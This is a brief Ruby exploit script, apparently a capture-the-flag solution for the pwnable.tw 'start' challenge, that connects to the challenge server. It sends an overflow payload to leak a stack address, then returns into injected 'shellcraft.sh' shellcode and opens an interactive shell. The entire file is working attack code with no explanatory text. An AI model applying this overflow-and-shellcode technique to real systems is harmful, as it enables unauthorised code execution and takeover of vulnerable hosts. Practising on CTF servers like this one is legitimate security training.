#!/usr/bin/ruby

require 'pwn'
require 'pry'

context.arch = 'i386'
context.log_level = :debug
z = Sock.new 'chall.pwnable.tw', 10000

z.recvuntil "Let's start the CTF:"
z.send p32(0x8048087).rjust(0x18, 'A')
stk = u32(z.recv 4096)
log.info "stack address: #{stk.hex}" # Log stack address

# Return to shellcode
addr = stk + 0x14
payload = addr.p32.rjust(0x18, 'A') + asm(shellcraft.sh)
z.write payload

# Switch to interactive mode
z.interact
